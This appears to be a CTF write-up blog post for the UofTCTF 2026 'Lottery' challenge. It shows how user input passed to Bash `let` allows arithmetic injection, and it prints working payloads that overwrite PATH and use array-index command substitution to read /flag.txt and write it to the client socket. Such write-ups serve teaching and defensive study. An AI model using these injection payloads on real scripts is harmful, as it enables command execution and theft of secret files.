+++
date = '2026-01-12T15:17:41+07:00'
draft = false
title = 'Write-up: UofTCTF 2026 - challenge Lottery (Misc)'
categories = ['Writeups', 'Jail', 'Misc', 'Security']
image = 'cover.jpg'
+++

# UofTCTF 2026 – Lottery (Misc) Write-up

## Description

Han Shangyan quietly gives away all his savings to protect someone he cares about, leaving himself with nothing.  
Now broke, his only hope is chance itself.

Can you help Han Shangyan win the lottery?

```
nc 35.245.30.212 5000
```

**Author:** SteakEnthusiast, White

---

## Source Analysis

Inside the provided `lottery.zip`, we are given a `Dockerfile`, which shows that the challenge is deployed using the `pwn.red/jail` framework.

```dockerfile
FROM pwn.red/jail

COPY --from=ubuntu@sha256:c35e29c9450151419d9448b0fd75374fec4fff364a27f176fb458d472dfc9e54 / /srv
RUN mkdir -p /srv/app
WORKDIR /srv/app
COPY --chmod=555 lottery.sh run
COPY flag.txt /srv/flag.txt

ENV JAIL_PIDS=10 JAIL_MEM=10M JAIL_TIME=120 JAIL_POW=10000
```

The challenge is **white-boxed**. The following Bash script contains the core logic.

```bash
#!/bin/bash

echo "Today's lottery!"
echo "Guess the winning ticket (hex):"
read guess

if [[ "$guess" =~ ^[0-9a-fA-F]+ ]]; then
    let "g = 0x$guess" 2>/dev/null
else
    echo "Invalid guess."
    exit 1
fi

ticket=$(head -c 16 /dev/urandom | md5sum | cut -c1-16)
let "t = 0x$ticket" 2>/dev/null

if [[ $g -eq $t ]]; then
    cat /flag.txt
else
    echo "Not a winner. Better luck next time!"
fi
```

---

## Breaking the Random Ticket

The ticket generation relies on external commands (`head`, `md5sum`, and `cut`), which are resolved through the `PATH` environment variable.

Because our input is injected into a Bash arithmetic expression using `let`, we can abuse the comma operator to perform variable assignments.

Payload:

```
0,PATH=0
```

This causes:

- `PATH` to be overwritten,
- the random ticket generation pipeline to fail,
- `ticket` to become an empty string,
- and `t` to evaluate to `0`.

This allows us to reach the winning branch; however, `cat` also breaks because it depends on `PATH`.

![](image.png)
---

## Bash Arithmetic Injection

While researching Bash arithmetic behavior, a similar vulnerability was found in **JSON Bourne (PlaidCTF 2020)**.

Key insight:

> Array indexing inside Bash arithmetic expressions triggers full expansion, including command substitution.

Example:

```bash
x='__[$(id)]'
y=$((1+x))
```

---

## Final Exploit

The final payload leverages array indexing to trigger command execution and redirects the flag output directly to the main process stdout.

```bash
0 + a[$(cat /flag.txt > /proc/1/fd/1)]
```

Explanation:

- `a[INDEX]` forces Bash to fully expand `INDEX`,
- `$()` inside `INDEX` is executed,
- output is redirected to `/proc/1/fd/1`, which corresponds to stdout of PID 1,
- PID 1 holds the socket connected to `nc`, so the flag is sent directly to the client.

---

## Flag

```
uoftctf{you_won_the_LETtery_(hahahaha_get_it???)}
```